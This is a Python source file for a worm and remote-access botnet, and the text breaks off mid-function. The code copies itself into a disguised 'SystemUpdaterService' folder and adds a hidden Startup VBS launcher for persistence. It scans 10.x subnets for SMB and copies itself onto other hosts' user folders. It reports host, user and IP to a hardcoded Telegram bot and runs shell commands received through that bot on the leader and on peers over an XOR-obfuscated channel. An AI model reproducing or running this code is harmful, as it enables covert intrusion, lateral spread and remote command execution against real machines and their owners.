# -*- coding: utf-8 -*-
import os
import sys
import socket
import threading
import subprocess
import time
import random
import base64
import json
import shutil
import getpass
import ipaddress
import tempfile
import platform # Needed for domain info attempt

# --- Import urllib modules ---
import urllib.request
import urllib.parse
import urllib.error
# json is already imported, socket is already imported for other uses

# Use standard library types directly for Python 3.9+
if sys.version_info < (3, 9):
    from typing import Union, Set, Tuple, List, Dict, Optional
else:
    from typing import Union, Optional # Set, Tuple, List, Dict are standard
    Set = set
    Tuple = tuple
    List = list
    Dict = dict


# --- Configuration ---
# WARNING: Hardcoding sensitive information like bot tokens is insecure.
# Consider using environment variables or a configuration file.
TELEGRAM_TOKEN = "8112275681:AAHbxG7UwkjlTF5S-PLPPMLy4FTZQsGjXso" # <--- REPLACE WITH YOUR ACTUAL TOKEN
CHAT_ID = "6544598901"       # <--- REPLACE WITH YOUR ACTUAL CHAT ID
PROXY_ADDRESS = "10.0.0.10:3128"    # Set to None or "" to disable proxy (e.g., PROXY_ADDRESS = None)
PERSISTENCE_SUBDIR_NAME = "SystemUpdaterService"
_appdata_path = os.getenv("LOCALAPPDATA") or os.getenv("TEMP")
PERSISTENCE_DIR = os.path.join(_appdata_path, PERSISTENCE_SUBDIR_NAME) if _appdata_path else ""
PERSISTENCE_PY_FILENAME = "su_svc.py"
STARTUP_VBS_NAME = "win_sysupdate_launch.vbs"
PEER_CACHE_FILENAME = "peer_node_cache.json"
PEER_CACHE_PATH = os.path.join(tempfile.gettempdir(), PEER_CACHE_FILENAME)
KEY = b"NSUEM_IS_THE_BEST" # WARNING: Simple XOR is NOT secure encryption.
SERVER_PORT = 8080
SCAN_TIMEOUT = 0.5
POLL_INTERVAL = 10 # Telegram poll interval (seconds) for leader
COORDINATION_INTERVAL = 30
GOSSIP_INTERVAL = 180
PING_TIMEOUT = 1.5
# --- Timeouts for urllib.request.urlopen ---
# urllib's timeout is for the entire operation (connect + read)
URLOPEN_TIMEOUT_SHORT = 15 # Timeout for sendMessage
URLOPEN_TIMEOUT_LONG = 40  # Timeout for getUpdates long poll
PEER_INFO_TIMEOUT = 300

# --- Global State ---
known_peer_ips: Set[str] = set()
PeerInfo = Dict[str, Union[str, float, None]]
known_peers_info: Dict[str, PeerInfo] = {}
is_telegram_leader: bool = False
self_ip: Optional[str] = None
peers_info_lock = threading.Lock()
leader_status_lock = threading.Lock()

# --- IP Filtering Helper ---
def is_target_ip(ip_str: Optional[str]) -> bool:
    """Checks if the IP address string starts with '10.'. Ensures basic validity."""
    return isinstance(ip_str, str) and ip_str.startswith("10.") and len(ip_str.split('.')) == 4

# --- Peer List Load/Save (Only IPs) ---
def load_peer_list_ips():
    """Loads and filters IPs from cache. Handles errors silently."""
    global known_peer_ips
    if not os.path.exists(PEER_CACHE_PATH):
        return
    try:
        with open(PEER_CACHE_PATH, 'r', encoding='utf-8') as f:
            peer_data = json.load(f)
            if isinstance(peer_data, list):
                valid_ips = set(ip for ip in peer_data if isinstance(ip, str) and is_target_ip(ip))
                with peers_info_lock:
                    known_peer_ips = valid_ips
    except (json.JSONDecodeError, IOError, TypeError, Exception):
        pass # Silent failure

def save_peer_list_ips():
    """Saves filtered IPs (only target IPs) to cache. Handles errors silently."""
    ips_to_save: List[str] = []
    with peers_info_lock:
        ips_to_save = sorted(list(ip for ip in known_peer_ips if is_target_ip(ip)))
    if not ips_to_save:
        return
    try:
        os.makedirs(os.path.dirname(PEER_CACHE_PATH), exist_ok=True)
        with open(PEER_CACHE_PATH, 'w', encoding='utf-8') as f:
            json.dump(ips_to_save, f, indent=2)
    except (IOError, TypeError, Exception):
        pass # Silent failure

# --- Utility Functions ---
def get_script_path() -> str:
    """Gets the absolute path of the currently running script/executable."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        try:
            return os.path.abspath(__file__)
        except NameError:
            return os.path.abspath(sys.argv[0])


def get_persisted_script_path() -> Optional[str]:
    """Gets the intended path for the script in PERSISTENCE_DIR."""
    if not PERSISTENCE_DIR:
        return None
    return os.path.join(PERSISTENCE_DIR, PERSISTENCE_PY_FILENAME)

def get_self_ip_address() -> str:
    """
    Determines the node's primary non-local IPv4 address matching the target prefix ('10.').
    Falls back to the first non-local, non-link-local IPv4 if no target IP is found.
    Caches the result.
    """
    global self_ip
    if self_ip:
        return self_ip
    target_ip_found: Optional[str] = None
    fallback_ip: str = "127.0.0.1"
    try:
        addr_info = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)
        for item in addr_info:
            ip = item[4][0]
            try:
                ipo = ipaddress.ip_address(ip)
                if not any([ipo.is_loopback, ipo.is_link_local, ipo.is_multicast, ipo.is_reserved]):
                    if is_target_ip(ip):
                        target_ip_found = ip
                        break
                    elif fallback_ip == "127.0.0.1" and not ipo.is_private:
                        fallback_ip = ip
                    elif fallback_ip == "127.0.0.1":
                        fallback_ip = ip
            except ValueError:
                continue
    except (socket.gaierror, Exception):
        pass
    self_ip = target_ip_found if target_ip_found else fallback_ip
    return self_ip

def add_to_startup():
    """Adds VBS to Startup folder pointing to persisted script (silent). Windows only."""
    if os.name != 'nt' or not PERSISTENCE_DIR:
        return
    try:
        appdata_roaming = os.getenv('APPDATA')
        if not appdata_roaming: return
        startup_folder = os.path.join(appdata_roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_vbs_path = os.path.join(startup_folder, STARTUP_VBS_NAME)
        target_py_path = get_persisted_script_path()
        if not target_py_path or not os.path.exists(target_py_path):
            return
        python_executable = "pythonw.exe"
        vbs_content = f'Set oShell = CreateObject("WScript.Shell")\noShell.Run "{python_executable} \""{target_py_path}\"\"", 0, False'
        os.makedirs(startup_folder, exist_ok=True)
        if not os.path.exists(startup_vbs_path):
            try:
                with open(startup_vbs_path, 'w', encoding='utf-8') as f:
                    f.write(vbs_content)
            except IOError: pass
    except Exception: pass

def persist_in_system() -> bool:
     """
     Copies the script to PERSISTENCE_DIR if not already running from there.
     Returns True if the script is now located in the persistence directory, False otherwise.
     Handles errors silently.
     """
     if not PERSISTENCE_DIR: return False
     target_path = get_persisted_script_path()
     source_path = get_script_path()
     if not target_path: return False
     try:
         if not source_path or not os.path.exists(source_path):
             return False

         if os.path.normcase(os.path.abspath(source_path)) == os.path.normcase(os.path.abspath(target_path)):
             return True
         if not os.path.exists(target_path):
             os.makedirs(PERSISTENCE_DIR, exist_ok=True)
             shutil.copy2(source_path, target_path)
             return True
         elif os.path.exists(target_path):
             return True
     except (IOError, OSError, shutil.Error, Exception):
         return False
     return False

# --- XOR Obfuscation (NOT Secure Encryption) ---
def encrypt_data(data: str) -> bytes:
    """XOR 'encrypts' string data using the hardcoded KEY and Base64 encodes it."""
    if not data: return b""
    try:
        data_bytes = data.encode('utf-8')
        key_len = len(KEY)
        encrypted_bytes = bytes([b ^ KEY[i % key_len] for i, b in enumerate(data_bytes)])
        return base64.b64encode(encrypted_bytes)
    except Exception:
        return b""

def decrypt_data(encrypted_data: bytes) -> str:
    """Base64 decodes and XOR 'decrypts' data using the hardcoded KEY."""
    if not encrypted_data: return ""
    try:
        if not isinstance(encrypted_data, bytes): return ""
        decoded_bytes = base64.b64decode(encrypted_data)
        key_len = len(KEY)
        decrypted_bytes = bytes([b ^ KEY[i % key_len] for i, b in enumerate(decoded_bytes)])
        return decrypted_bytes.decode('utf-8')
    except (base64.binascii.Error, UnicodeDecodeError, TypeError, Exception):
        return ""

# --- urllib Proxy Helper ---
def _get_urllib_proxy_config() -> Optional[Dict[str, str]]:
    """Constructs the proxy dictionary for urllib.request.ProxyHandler."""
    if PROXY_ADDRESS:
        proxy_url = f"http://{PROXY_ADDRESS}" # Prepend http:// scheme
        return {
            "http": proxy_url,
            "https": proxy_url,
        }
    return None

# --- Telegram Communication (Using urllib.request) ---
def send_telegram_message(text: str):
    """
    Sends message via urllib.request. Handles proxy. Silent failure.
    """
    if not TELEGRAM_TOKEN or not CHAT_ID or TELEGRAM_TOKEN == "YOUR_BOT_TOKEN":
        return
    if not text:
        return

    api_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    
    max_length = 4096
    if len(text.encode('utf-8')) > max_length:
        encoded_text = text.encode('utf-8')[:max_length - 15]
        text = encoded_text.decode('utf-8', errors='ignore') + "... (truncated)"

    payload_dict = {
        "chat_id": str(CHAT_ID),
        "text": text,
        "parse_mode": "Markdown"
    }
    
    try:
        data = json.dumps(payload_dict).encode('utf-8')
        headers = {'Content-Type': 'application/json'}
        req = urllib.request.Request(api_url, data=data, headers=headers, method='POST')

        proxy_config = _get_urllib_proxy_config()
        if proxy_config:
            proxy_handler = urllib.request.ProxyHandler(proxy_config)
            # For HTTPS proxies that might have self-signed certs, you might need to handle SSL context.
            # For now, assuming standard proxy behavior or direct connection.
            # If SSL errors occur with proxy:
            # import ssl
            # context = ssl._create_unverified_context() # Less secure
            # opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPSHandler(context=context))
            opener = urllib.request.build_opener(proxy_handler)
            with opener.open(req, timeout=URLOPEN_TIMEOUT_SHORT) as response:
                # response.read() # Optionally read response, but for sendMessage, status is enough
                if response.status not in range(200, 300):
                    # Log error if needed, but fail silently as per original
                    pass
        else:
            with urllib.request.urlopen(req, timeout=URLOPEN_TIMEOUT_SHORT) as response:
                if response.status not in range(200, 300):
                    pass
                    
    except urllib.error.HTTPError: # Catches non-2xx HTTP status codes
        pass # Fail silently
    except urllib.error.URLError:   # Catches network errors (DNS, connection refused, etc.)
        pass # Fail silently
    except socket.timeout:
        pass # Fail silently on timeout
    except Exception:
        pass # Fail silently on other errors


def register_node_telegram():
    """Sends initial node online message (silent)."""
    try:
        my_ip = get_self_ip_address()
        hostname = socket.gethostname()
        username = getpass.getuser()
        message = f"🟢 *NODE ONLINE*\n" \
                  f"*Host:* `{hostname}`\n" \
                  f"*User:* `{username}`\n" \
                  f"*IP:* `{my_ip}`"
        send_telegram_message(message)
    except Exception:
        pass # Keep silent

def handle_telegram_commands():
    """
    Polls Telegram for commands using urllib.request (Leader Node Only).
    Uses long polling. Handles commands via process_telegram_command.
    Runs in a separate thread. Silent operation.
    """
    global is_telegram_leader
    last_update_id = 0

    while True:
        with leader_status_lock:
            leader = is_telegram_leader
        if not leader:
            time.sleep(COORDINATION_INTERVAL * 1.5)
            continue

        api_url_base = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
        params_dict = {
            "offset": last_update_id + 1,
            "timeout": 30 # Long polling timeout for Telegram API
        }
        query_string = urllib.parse.urlencode(params_dict)
        api_url = f"{api_url_base}?{query_string}"

        try:
            req = urllib.request.Request(api_url, method='GET')
            proxy_config = _get_urllib_proxy_config()
            response_body = None

            if proxy_config:
                proxy_handler = urllib.request.ProxyHandler(proxy_config)
                opener = urllib.request.build_opener(proxy_handler)
                with opener.open(req, timeout=URLOPEN_TIMEOUT_LONG) as response:
                    if response.status == 200:
                        response_body = response.read().decode('utf-8')
            else:
                with urllib.request.urlopen(req, timeout=URLOPEN_TIMEOUT_LONG) as response:
                    if response.status == 200:
                        response_body = response.read().decode('utf-8')
            
            if response_body:
                response_data = json.loads(response_body)
                if response_data.get("ok") and isinstance(response_data.get("result"), list):
                    updates = response_data["result"]
                    if updates:
                        for update in updates:
                            current_update_id = update.get("update_id")
                            if current_update_id:
                                last_update_id = max(last_update_id, current_update_id)

                            if "message" in update and isinstance(update["message"], dict):
                                message_data = update["message"]
                                chat_info = message_data.get("chat")
                                command_text = message_data.get("text")

                                if chat_info and isinstance(chat_info, dict) and command_text:
                                    chat_id = chat_info.get("id")
                                    if str(chat_id) == str(CHAT_ID):
                                        process_telegram_command(command_text.strip())
                        time.sleep(1) # Small delay after processing updates
                    else:
                        # No updates, part of normal long polling
                        time.sleep(POLL_INTERVAL / 3) # Shorter sleep as timeout might have occurred
                else:
                    # Telegram API returned 'ok: false' or unexpected structure
                    time.sleep(POLL_INTERVAL)
            else:
                # No response body or non-200 status if not caught by HTTPError
                time.sleep(POLL_INTERVAL)


        except socket.timeout: # Specifically for urllib's timeout
            time.sleep(1) # Expected for long polling, retry sooner
        except urllib.error.HTTPError as e:
            # Handle specific HTTP errors if needed, e.g. 401, 404
            # For now, generic retry
            # print(f"HTTP Error: {e.code} {e.reason}")
            time.sleep(POLL_INTERVAL * 2)
        except urllib.error.URLError as e:
            # Network/request errors (e.g., connection refused, DNS failure)
            # print(f"URL Error: {e.reason}")
            time.sleep(POLL_INTERVAL * 2)
        except json.JSONDecodeError:
            # print("JSON Decode Error")
            time.sleep(POLL_INTERVAL) # JSON decode errors
        except Exception:
            # print(f"Other exception in telegram poll: {e_gen}")
            time.sleep(POLL_INTERVAL * 2) # Other unexpected errors


def process_telegram_command(command_text: str):
    """Processes a single command received from Telegram (executed by leader)."""
    target_host: Optional[str] = None
    actual_command: Optional[str] = None
    my_ip = get_self_ip_address()
    my_hostname = socket.gethostname()
    creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0

    try:
        # Command parsing logic (same as before)
        if command_text.startswith("/exec @"):
            parts = command_text.split(None, 2)
            if len(parts) == 3 and parts[1].startswith("@") and len(parts[1]) > 1:
                target_host = parts[1][1:]
                actual_command = parts[2]
            else:
                send_telegram_message("❌ Invalid command format.\nUsage: `/exec @hostname <command>`")
                return
        elif command_text.startswith("/exec"):
            parts = command_text.split(None, 1)
            if len(parts) == 2:
                actual_command = parts[1]
            else:
                send_telegram_message("❌ Invalid command format.\nUsage: `/exec <command>`")
                return
        elif command_text == "/info":
            hostname = socket.gethostname()
            username = getpass.getuser()
            leader_ip = get_self_ip_address()
            message = f"ℹ️ *LEADER INFO*\n" \
                      f"*Host:* `{hostname}`\n" \
                      f"*User:* `{username}`\n" \
                      f"*IP:* `{leader_ip}`"
            send_telegram_message(message)
            return
        elif command_text == "/ping":
            leader_ip = get_self_ip_address()
            send_telegram_message(f"✅ Pong from Leader! (`{leader_ip}`)")
            return
        elif command_text == "/list_peers":
            peer_list_lines: List[str] = []
            peer_count = 0
            current_time = time.time()
            with peers_info_lock:
                # Create a temporary list of active peers for display
                active_peers_info = {
                    ip: info for ip, info in known_peers_info.items()
                    if current_time - info.get("last_seen", 0) < PEER_INFO_TIMEOUT
                }
                # Sort active peers
                sorted_active_peers = sorted(active_peers_info.items(), key=lambda item: item[1].get('hostname') or item[0])

                for ip, info in sorted_active_peers:
                    hostname = info.get("hostname", "N/A")
                    leader_marker = " (Leader)" if ip == my_ip else ""
                    peer_list_lines.append(f"- `{hostname}` (`{ip}`){leader_marker}")
                    peer_count += 1

            if not peer_list_lines:
                 peer_list_str = "No active target peers found."
                 # Add self if it's a target IP and should be listed
                 if is_target_ip(my_ip):
                     peer_count = 1
                     peer_list_str = f"- `{my_hostname}` (`{my_ip}`) (Leader)\n"
            else:
                 peer_list_str = "\n".join(peer_list_lines)

            send_telegram_message(f"👥 *Active Peers ({peer_count}):*\n{peer_list_str}")
            return
        else:
            return

        # --- Command Execution Logic ---
        if actual_command:
            if target_host:
                # --- Remote execution request ---
                target_ip: Optional[str] = None
                valid_peer_found = False
                with peers_info_lock:
                    for ip, info in known_peers_info.items():
                        if info.get("hostname") == target_host:
                            # Check if peer is active enough for execution attempt
                            if time.time() - info.get("last_seen", 0) < PEER_INFO_TIMEOUT * 1.5:
                                target_ip = ip
                                valid_peer_found = True
                                break
                if valid_peer_found and target_ip:
                    payload = f"CMD_EXEC:{actual_command}"
                    encrypted_payload = encrypt_data(payload)
                    if encrypted_payload:
                        response = send_cmd_to_peer(target_ip, encrypted_payload)
                        if response:
                            max_resp_len = 3800
                            if len(response.encode('utf-8')) > max_resp_len:
                                truncated_resp = response.encode('utf-8')[:max_resp_len].decode('utf-8', 'ignore') + "\n... (output truncated)"
                            else:
                                truncated_resp = response
                            send_telegram_message(f"💻 *Output from {target_host} ({target_ip}):*\n```\n{truncated_resp}\n```")
                        else:
                            send_telegram_message(f"⚠️ No response or P2P error communicating with {target_host} (`{target_ip}`). Peer might be offline or unresponsive.")
                    else:
                        send_telegram_message(f"❌ Error encrypting command for {target_host}.")
                else:
                    send_telegram_message(f"❓ Host `{target_host}` not found among recently active peers or info is too stale.")
            else:
                # --- Local execution on the leader node ---
                send_telegram_message(f"🚀 Executing on Leader (`{my_ip}`):\n```\n{actual_command}\n```")
                output = ""
                try:
                    process = subprocess.run(
                        actual_command, shell=True, check=False, capture_output=True,
                        text=True, timeout=60, errors='ignore', creationflags=creationflags
                    )
                    stdout = process.stdout.strip() if process.stdout else "None"
                    stderr = process.stderr.strip() if process.stderr else "None"
                    output = f"✅ *Leader Execution Complete (RC={process.returncode})*\n" \
                             f"*STDOUT:*\n```\n{stdout}\n```\n" \
                             f"*STDERR:*\n```\n{stderr}\n```"
                except subprocess.TimeoutExpired:
                    output = "❌ *Leader Execution Error:*\nCommand timed out after 60 seconds."
                except Exception as e_exec:
                    output = f"❌ *Leader Execution Error:*\n```\n{str(e_exec)}\n```"

                max_resp_len = 3800
                if len(output.encode('utf-8')) > max_resp_len:
                    truncated_output = output.encode('utf-8')[:max_resp_len].decode('utf-8', 'ignore') + "\n... (output truncated)"
                else:
                    truncated_output = output
                send_telegram_message(truncated_output)

    except Exception as e_proc:
        send_telegram_message(f"❌ Internal error processing command:\n`{command_text}`\nError: `{str(e_proc)}`")

# --- Network Spreading ---
def scan_network_for_smb() -> List[str]:
    """Scans specific 10.* ranges for open SMB port 445."""
    hosts_found: List[str] = []
    my_ip = get_self_ip_address()
    if not is_target_ip(my_ip): return []
    checked_ips: Set[str] = set()
    if my_ip: checked_ips.add(my_ip)
    try:
        ip_parts = my_ip.split('.')
        if len(ip_parts) == 4:
            local_prefix = '.'.join(ip_parts[:3])
            for i in range(1, 16): # Reduced from 255 for faster demo scan
                target_ip = f"{local_prefix}.{i}"
                if target_ip not in checked_ips:
                    checked_ips.add(target_ip)
                    if check_smb(target_ip): hosts_found.append(target_ip)
    except Exception: pass
    second_octet_ranges = [range(151, 158), range(131, 143), range(121, 125)]
    try:
        checks_done_stage2 = 0
        max_checks_stage2 = 500 # Limit scans for demo purposes
        for r in second_octet_ranges:
            if checks_done_stage2 >= max_checks_stage2: break
            for second_octet in r:
                if checks_done_stage2 >= max_checks_stage2: break
                third_octets_shuffled = list(range(256)); random.shuffle(third_octets_shuffled)
                for third_octet in third_octets_shuffled: # Scan all 3rd octets
                    if checks_done_stage2 >= max_checks_stage2: break
                    for fourth_octet in range(1, 16): # Prioritize lower IPs in last octet
                        target_ip = f"10.{second_octet}.{third_octet}.{fourth_octet}"
                        if target_ip not in checked_ips:
                            checked_ips.add(target_ip)
                            if check_smb(target_ip): hosts_found.append(target_ip)
                            checks_done_stage2 += 1
                            if checks_done_stage2 >= max_checks_stage2: break
    except Exception: pass
    return sorted(list(set(hosts_found)))

def check_smb(ip: str) -> bool:
    """Checks if SMB port 445 is open (silent)."""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SCAN_TIMEOUT)
        result = sock.connect_ex((ip, 445))
        return result == 0
    except (socket.timeout, socket.error, OSError, Exception):
        return False
    finally:
        if sock:
            try: sock.close()
            except Exception: pass

def _attempt_copy_operations(target_ip: str, base_unc_path: str, current_script_path: str) -> bool:
    """
    Internal helper to perform file operations for a given base UNC path.
    Returns True on success, raises expected exceptions on failure.
    """
    try:
        remote_persist_dir_unc = os.path.join(base_unc_path, 'AppData', 'Local', PERSISTENCE_SUBDIR_NAME)
        remote_script_path_unc = os.path.join(remote_persist_dir_unc, PERSISTENCE_PY_FILENAME)
        remote_startup_folder_unc = os.path.join(base_unc_path, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        remote_startup_vbs_path_unc = os.path.join(remote_startup_folder_unc, STARTUP_VBS_NAME)

        os.makedirs(remote_persist_dir_unc, exist_ok=True)
        shutil.copy2(current_script_path, remote_script_path_unc)

        remote_python_executable = 'pythonw.exe'
        remote_script_path_for_vbs = os.path.join(r'%LOCALAPPDATA%', PERSISTENCE_SUBDIR_NAME, PERSISTENCE_PY_FILENAME)
        remote_vbs_content = f'Set oShell = CreateObject("WScript.Shell")\noShell.Run "{remote_python_executable} \""{remote_script_path_for_vbs}\"\"", 0, False'

        os.makedirs(remote_startup_folder_unc, exist_ok=True)

        with open(remote_startup_vbs_path_unc, 'w', encoding='utf-8') as f:
            f.write(remote_vbs_content)
        return True
    except (FileNotFoundError, PermissionError, OSError, IOError, shutil.Error) as e:
        raise e 
    except Exception as e_inner:
        raise e_inner

def copy_to_host(ip: str):
    r"""
    Attempts network spread sequentially:
    1. NON-STANDARD format: \\host\users\username.domain
    2. STANDARD format:     \\host\Users\username
    Stops on first success. Operates silently on failure. Requires Windows.
    """
    if not is_target_ip(ip) or os.name != 'nt':
        return
    try:
        full_username = getpass.getuser()
        username_parts = full_username.split('\\')
        if len(username_parts) == 2:
            domain_name = username_parts[0]
            username_only = username_parts[1]
        else:
            username_only = full_username
            domain_name = os.getenv('USERDOMAIN') or os.getenv('COMPUTERNAME', '')

        if not username_only or not domain_name:
            return

        current_script_path = get_script_path()
        if not current_script_path or not os.path.exists(current_script_path):
            return

        target_user_folder_attempt1 = f"{username_only}.{domain_name}"
        unc_path_attempt1 = fr'\\{ip}\users\{target_user_folder_attempt1}'
        try:
            if _attempt_copy_operations(ip, unc_path_attempt1, current_script_path):
                with leader_status_lock:
                    if is_telegram_leader:
                        send_telegram_message(f"✅ Spread successful to `{ip}` using non-standard format (`\\users\\{target_user_folder_attempt1}`).")
                return 
        except (FileNotFoundError, PermissionError, OSError, IOError, shutil.Error):
            pass 
        except Exception:
             return

        unc_path_attempt2 = fr'\\{ip}\Users\{username_only}'
        try:
            if _attempt_copy_operations(ip, unc_path_attempt2, current_script_path):
                with leader_status_lock:
                    if is_telegram_leader:
                        send_telegram_message(f"✅ Spread successful to `{ip}` using standard format (`\\Users\\{username_only}`).")
                return 
        except (FileNotFoundError, PermissionError, OSError, IOError, shutil.Error):
            pass 
        except Exception:
             return
    except Exception:
        pass

# --- Peer-to-Peer Communication & Coordination ---
def connect_to_peer(ip: str) -> Optional[socket.socket]:
    """Establishes plain TCP connection if target IP starts with 10 (silent)."""
    if not is_target_ip(ip): return None
    sock: Optional[socket.socket] = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(PING_TIMEOUT)
        sock.connect((ip, SERVER_PORT))
        return sock
    except (socket.timeout, socket.error, OSError, Exception):
        if sock:
            try: sock.close()
            except Exception: pass
        return None

def check_peer_alive(ip: str) -> Tuple[bool, Optional[str]]:
    """Checks peer liveness via plain TCP + XORed PING/PONG (silent). Returns (is_alive, hostname)."""
    conn = connect_to_peer(ip)
    is_alive = False
    hostname: Optional[str] = None
    if not conn: return False, None
    try:
        ping_payload = encrypt_data("PING")
        if not ping_payload: return False, None
        conn.sendall(ping_payload)
        conn.settimeout(PING_TIMEOUT + 1.0)
        encrypted_response = conn.recv(1024)
        if encrypted_response:
            decrypted_response = decrypt_data(encrypted_response)
            if decrypted_response and decrypted_response.startswith("PONG:"):
                parts = decrypted_response.split(':', 2)
                if len(parts) == 3:
                    hostname = parts[2]
                    is_alive = True
    except (socket.timeout, socket.error, ConnectionResetError, Exception):
        pass
    finally:
        if conn:
            try: conn.close()
            except Exception: pass
    return is_alive, hostname

def request_peers_from(ip: str) -> Set[str]:
    """Requests peer list via plain TCP + XORed payload, filters response (silent)."""
    peer_list_ips: Set[str] = set()
    conn = connect_to_peer(ip)
    if not conn: return peer_list_ips
    try:
        get_peers_payload = encrypt_data("GET_PEERS")
        if not get_peers_payload: return peer_list_ips
        conn.sendall(get_peers_payload)
        conn.settimeout(PING_TIMEOUT + 3.0)
        encrypted_response = conn.recv(8192)
        if encrypted_response:
            decrypted_response = decrypt_data(encrypted_response)
            if decrypted_response and decrypted_response.startswith("PEERS:"):
                json_payload = decrypted_response[6:]
                try:
                    peers_data = json.loads(json_payload)
                    if isinstance(peers_data, list):
                        my_ip = get_self_ip_address()
                        valid_received_peers = set(
                            p for p in peers_data
                            if isinstance(p, str) and is_target_ip(p) and p != my_ip
                        )
                        peer_list_ips = valid_received_peers
                except json.JSONDecodeError: pass
    except (socket.timeout, socket.error, ConnectionResetError, Exception):
        pass
    finally:
        if conn:
            try: conn.close()
            except Exception: pass
    return peer_list_ips

def send_cmd_to_peer(ip: str, encrypted_payload: bytes) -> Optional[str]:
     """Sends XORed command via plain TCP, returns decrypted response (silent)."""
     response_text: Optional[str] = None
     conn = connect_to_peer(ip)
     if not conn: return None
     try:
         conn.sendall(encrypted_payload)
         conn.settimeout(75) 
         encrypted_response_chunks = []
         while True:
             try:
                 chunk = conn.recv(8192)
                 if not chunk: break
                 encrypted_response_chunks.append(chunk)
             except socket.timeout:
                 if not encrypted_response_chunks:
                     response_text = "PEER_ERROR: Timeout waiting for response from peer."
                 break
             except (socket.error, ConnectionResetError) as e:
                  response_text = f"PEER_ERROR: Network error receiving response ({e})"
                  break

         if encrypted_response_chunks:
             full_encrypted_response = b"".join(encrypted_response_chunks)
             decrypted = decrypt_data(full_encrypted_response)
             response_text = decrypted if decrypted else "PEER_ERROR: Failed to decrypt response."
     except (socket.timeout, socket.error, ConnectionResetError) as e:
         response_text = f"PEER_ERROR: Network error during communication ({e})"
     except Exception as e:
         response_text = f"PEER_ERROR: Unexpected error ({e})"
     finally:
         if conn:
             try: conn.close()
             except Exception: pass
     return response_text

def handle_peer_connection(conn: socket.socket, addr: Tuple[str, int]):
    """Handles incoming plain TCP connections. Uses XOR for payload (silent)."""
    client_ip = addr[0]
    creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
    try:
        conn.settimeout(15)
        encrypted_data = conn.recv(2048)
        if not encrypted_data: return
        decrypted_command = decrypt_data(encrypted_data)
        if not decrypted_command: return

        response_payload: str = ""
        if decrypted_command == "PING":
            my_ip = get_self_ip_address()
            my_hostname = socket.gethostname()
            response_payload = f"PONG:{my_ip}:{my_hostname}"
        elif decrypted_command == "GET_PEERS":
            current_peer_ips_list: List[str] = []
            with peers_info_lock:
                current_peer_ips_list = sorted(list(ip for ip in known_peer_ips if is_target_ip(ip)))
            my_ip = get_self_ip_address()
            if is_target_ip(my_ip) and my_ip not in current_peer_ips_list:
                current_peer_ips_list.append(my_ip); current_peer_ips_list.sort()
            try: peers_json = json.dumps(current_peer_ips_list)
            except TypeError: peers_json = "[]"
            response_payload = f"PEERS:{peers_json}"
        elif decrypted_command.startswith("CMD_EXEC:"):
            command_to_run = decrypted_command[9:]
            try:
                 process = subprocess.run(
                     command_to_run, shell=True, check=False, capture_output=True,
                     text=True, timeout=60, errors='ignore', creationflags=creationflags
                 )
                 stdout = process.stdout.strip() if process.stdout else ""
                 stderr = process.stderr.strip() if process.stderr else ""
                 response_payload = f"RC={process.returncode}\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}"
            except subprocess.TimeoutExpired:
                 response_payload = "REMOTE_ERROR: Command timed out after 60 seconds."
            except Exception as e:
                 response_payload = f"REMOTE_ERROR: Failed to execute command: {str(e)}"
        else:
            response_payload = "ERROR: Unknown command"

        if response_payload:
            encrypted_response = encrypt_data(response_payload)
            if encrypted_response:
                try: conn.sendall(encrypted_response)
                except (socket.error, OSError): pass
    except (socket.timeout, socket.error, ConnectionResetError, Exception):
        pass
    finally:
        try: conn.close()
        except Exception: pass

def peer_server_loop():
    """Listens for plain TCP P2P connections, checks incoming IP (silent)."""
    server_socket: Optional[socket.socket] = None
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', SERVER_PORT))
        server_socket.listen(10)

        while True:
            client_socket = None
            try:
                client_socket, client_address = server_socket.accept()
                client_ip = client_address[0]
                if not is_target_ip(client_ip):
                    try: client_socket.close() 
                    except Exception: pass
                    continue 

                handler_thread = threading.Thread(
                    target=handle_peer_connection, args=(client_socket, client_address), daemon=True
                )
                handler_thread.start()

            except socket.error:
                if client_socket: 
                    try: client_socket.close()
                    except Exception: pass
                if server_socket and server_socket.fileno() == -1: 
                    break 
                time.sleep(0.1) 
            except Exception:
                if client_socket: 
                    try: client_socket.close()
                    except Exception: pass
                time.sleep(1) 
    except OSError as e_bind:
        send_telegram_message(f"❌ *CRITICAL ERROR*\nNode `{get_self_ip_address()}` failed to bind to P2P port {SERVER_PORT}. Server inactive. Error: `{e_bind}`")
    except Exception as e_server:
        send_telegram_message(f"❌ *CRITICAL ERROR*\nNode `{get_self_ip_address()}` encountered a fatal error in the P2P server loop: `{e_server}`")
    finally:
        if server_socket:
            try: server_socket.close()
            except Exception: pass

def coordination_loop():
    """Manages peer discovery, liveness, info, leader election, gossip, saving (silent)."""
    global known_peer_ips, known_peers_info, is_telegram_leader
    last_gossip_time = 0
    last_smb_scan_time = 0
    last_peer_save_time = time.time()
    my_ip = get_self_ip_address()
    my_hostname = socket.gethostname()
    load_peer_list_ips()
    current_time_init = time.time()
    with peers_info_lock:
        if is_target_ip(my_ip):
            known_peers_info[my_ip] = {"hostname": my_hostname, "last_seen": current_time_init}
            if my_ip not in known_peer_ips: known_peer_ips.add(my_ip)
        for ip in known_peer_ips:
            if ip not in known_peers_info:
                known_peers_info[ip] = {"hostname": None, "last_seen": 0}

    while True:
        start_time = time.time()
        peers_changed = False; info_updated = False
        peers_to_check_set: Set[str] = set()
        with peers_info_lock: peers_to_check_set = known_peer_ips.copy()
        if my_ip in peers_to_check_set: peers_to_check_set.remove(my_ip)

        current_alive_target_peers: Dict[str, PeerInfo] = {}
        if is_target_ip(my_ip):
            current_alive_target_peers[my_ip] = {"hostname": my_hostname, "last_seen": start_time}

